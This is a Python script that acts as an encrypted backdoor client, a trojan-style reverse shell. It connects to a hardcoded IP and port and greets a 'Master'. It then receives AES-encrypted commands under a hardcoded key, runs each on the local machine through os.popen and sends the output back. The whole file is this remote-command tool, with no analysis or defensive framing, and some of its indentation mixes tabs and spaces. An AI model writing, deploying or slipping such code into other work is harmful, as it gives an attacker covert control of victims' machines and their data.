import socket, sys, select, os, random, string
from Crypto.Cipher import AES

#initialize encryption
iv = ''.join([chr(random.randint(0, 0xFF)) for i in range(16)])
ncrypt = AES.new ('torjak#69maligro', AES.MODE_CBC, iv)

#initialize socket
ipaddr = "192.168.32.195"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect ((ipaddr, 6969))
#Send initial connection message
cmd = "Hello Master its me: " + ipaddr
if (len(cmd) % 16 != 0):
    cmd += ' ' * (16 - len(cmd) % 16) # <- padded with spaces

cmd = ncrypt.encrypt(cmd)
sock.send(cmd)
while (1):
	try:
 		read, write, err = select.select([sock],[], [])
		for IO in read:
			if IO is sock:
				data = sock.recv(4096)
				if data:
					print ('received: ' + data)
					data = ncrypt.decrypt(data)
					data = data.rstrip()
					print ('decoded: ' + data)
					cmd = os.popen(data).read()
					if (len(cmd) % 16 != 0):
            					cmd += ' ' * (16 - len(cmd) % 16) # <- padded with spaces
					cmd = ncrypt.encrypt(cmd)
					sock.send(cmd)
				else:
					sock.close()
					sys.exit()
			#else:
				#print('readline')
				#cmd = sys.stdin.readline()
				#if cmd == "exit\n":
			#		sys.exit()
			#	else:
		 	#		sock.send(cmd)

	except Exception as e:
		print (e)
		sock.close()
		sys.exit(0)

#sock.close()


